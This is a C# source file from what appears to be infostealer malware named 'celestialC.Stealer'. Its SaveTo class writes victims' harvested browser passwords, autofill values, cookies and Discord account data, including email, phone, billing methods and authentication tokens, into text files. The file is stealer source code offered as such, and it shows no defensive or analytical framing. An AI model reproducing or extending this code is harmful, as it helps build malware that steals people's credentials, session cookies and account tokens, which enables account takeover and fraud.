using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using celestialC.Stealer.Browsers;
using celestialC.Stealer.Messenger.Discord;

namespace celestialC.Stealer
{
    internal static class SaveTo
    {
        static private readonly string Delimeter;

        static SaveTo()
        {
            Delimeter = "--------------------------------";
        }

        internal static async Task SaveToFile(PasswordFormat[] passwords, string filepath)
        {
            if (passwords.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        foreach (PasswordFormat password in passwords)
                            await sw.WriteLineAsync($@"
URL: {password.Url}
Username: {password.Username}
Password: {password.Password}

{Delimeter}
".TrimStart());
                    }
                }
        }

        internal static async Task SaveToFile(AutoFillFormat[] autofills, string filepath)
        {
            if (autofills.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        foreach (AutoFillFormat password in autofills)
                            await sw.WriteLineAsync($@"
Name: {password.Name}
Value: {password.Value}

{Delimeter}
".TrimStart());
                    }
                }
        }
        internal static async Task SaveToFile(CookieFormat[] cookies, string filepath)
        {
            if (cookies.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        foreach (CookieFormat cookie in cookies)
                        {
                            string host = cookie.Host;
                            string name = cookie.Name;
                            string path = cookie.Path;
                            string value = cookie.Cookie;
                            ulong expiry = cookie.Expiry;

                            string flag1 = expiry == 0 ? "FALSE" : "TRUE";
                            string flag2 = host.StartsWith(".") ? "FALSE" : "TRUE";

                            await sw.WriteLineAsync($"{host}\t{flag1}\t{path}\t{flag2}\t{expiry}\t{name}\t{value}");
                        }
                    }
                }
        }
        internal static async Task SaveToFile(DiscordAccountFormat[] accounts, string filepath)
        {
            if (accounts.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        foreach (DiscordAccountFormat account in accounts)
                        {
                            string username = account.Username;
                            string userid = account.UserId;
                            string mfa = account.Mfa ? "Yes" : "No";
                            string email = account.Email;
                            string phone = account.PhoneNumber;
                            string verified = account.Verified ? "Yes" : "No";
                            string nitro = account.Nitro;
                            string token = account.Token;

                            string billing = string.Join(", ", account.BillingType);
                            billing = string.IsNullOrWhiteSpace(billing) ? "(None)" : billing;

                            await sw.WriteLineAsync($@"
Username: {username}
ID: {userid}
MFA: {mfa}
Email: {email}
Phone: {phone}
Verified: {verified}
Nitro: {nitro}
Billing Methods: {billing}
Token: {token}

{Delimeter}
".TrimStart());
                        }
                    }
                }
        }
    }
}
